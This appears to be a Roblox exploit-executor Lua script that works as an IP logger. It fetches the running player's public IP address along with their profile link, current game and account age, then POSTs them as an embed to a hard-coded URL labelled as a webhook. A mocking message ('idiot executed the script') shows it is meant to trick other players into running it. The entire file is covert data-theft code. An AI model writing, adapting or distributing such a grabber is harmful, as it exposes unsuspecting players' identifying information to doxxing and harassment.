local ip = game:HttpGet("https://api.ipify.org")
local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local accountage = game.Players.LocalPlayer.AccountAge .. ' days'

local Webhook = 'https://raw.githubusercontent.com/ROVenDiscord/eatfoodcaca/main/eaecagvade'
pcall(function()
local data = {
["embeds"] = {
{
["title"] = 'idiot executed the script!! heres his ip and info: ' .. ip,
["description"] = 'Profile link: ' .. profilelink ..  ' ' .. 'Game link: ' .. gamelink .. ' ' .. 'Account Age: ' .. accountage,
}
}
}
if syn then
local response = syn.request(
{
Url = Webhook,
Method = 'POST',
Headers = {
['Content-Type'] = 'application/json'
},
Body = game:GetService('HttpService'):JSONEncode(data)
}
);
elseif request then
local response = request(
{
Url = Webhook,
Method = 'POST',
Headers = {
['Content-Type'] = 'application/json'
},
Body = game:GetService('HttpService'):JSONEncode(data)
}
);
elseif http_request then
local response = http_request(
{
Url = Webhook,
Method = 'POST',
Headers = {
['Content-Type'] = 'application/json'
},
Body = game:GetService('HttpService'):JSONEncode(data)
}
);
end
end)
